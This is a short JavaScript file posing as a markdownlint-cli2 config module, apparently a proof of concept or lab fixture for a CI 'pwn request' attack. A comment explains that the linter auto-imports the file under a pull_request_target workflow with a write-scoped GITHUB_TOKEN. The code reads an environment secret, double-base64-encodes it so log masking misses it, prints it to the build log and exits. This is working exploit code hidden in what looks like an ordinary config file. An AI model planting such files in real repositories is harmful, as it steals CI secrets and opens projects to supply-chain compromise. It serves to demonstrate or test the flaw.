// Attacker-controlled markdownlint-cli2 config module.
// Auto-discovered at repo root and imported via await import() by
// markdownlint-cli2 before linting (noImport not set), so this runs
// arbitrary Node.js in the pull_request_target base-repo context with
// a write-scoped GITHUB_TOKEN. Leaks the toy secret and exits.
const s = process.env.GERALT_SECRET || '';
console.log('GERALT_LEAKED_TOKEN=' + Buffer.from(Buffer.from(s, 'utf8').toString('base64'), 'utf8').toString('base64'));
process.exit(1);
export default {};
